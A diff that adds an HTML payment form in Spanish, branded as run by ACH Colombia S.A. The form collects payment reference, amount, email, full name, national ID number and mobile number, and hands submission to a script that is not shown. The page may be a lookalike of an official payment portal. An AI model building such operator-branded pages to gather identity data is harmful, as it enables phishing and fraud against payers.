@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<title>Información de Pago</title>
+<link rel="stylesheet" href="styles.css">
+</head>
+
+<body>
+
+<header>
+<img src="img/autologo.jpg" class="logo">
+</header>
+
+<div class="contenedor">
+
+<div class="titulo">
+🔒 INFORMACION DE PAGO
+</div>
+
+<form id="formPago">
+
+<label>Referencia de pago</label>
+<input id="referencia" type="text" required>
+
+<label>Concepto de pago</label>
+<input id="concepto" type="text" required>
+
+<label>Valor de la consignación</label>
+<input id="valor" type="number" required>
+
+<label>Email</label>
+<input id="email" type="email" required>
+
+<label>Nombre completo</label>
+<input id="nombre" type="text" required>
+
+<label>Número de cédula</label>
+<input id="cedula" type="number" required>
+
+<label>Número de celular</label>
+<input id="celular" type="tel" required>
+
+<button type="button" onclick="pagar()">PAGAR</button>
+
+</form>
+
+<div class="info">
+
+El pago se efectuará utilizando los servicios de ACH Colombia, ya sea realizando el débito desde su cuenta corriente, ahorros o de depósitos electrónicos a través del botón de PSE o tarjeta crédito si tiene el convenio.
+
+</div>
+
+</div>
+
+<footer>
+
+<div class="logos">
+
+<img src="img/img-vigilado.png">
+<img src="img/img-ach.png">
+
+</div>
+
+<p>
+Todos los derechos reservados © <br>
+Sitio administrado por: ACH Colombia S.A
+</p>
+
+</footer>
+
+<script src="script.js"></script>
+
+</body>
+</html>
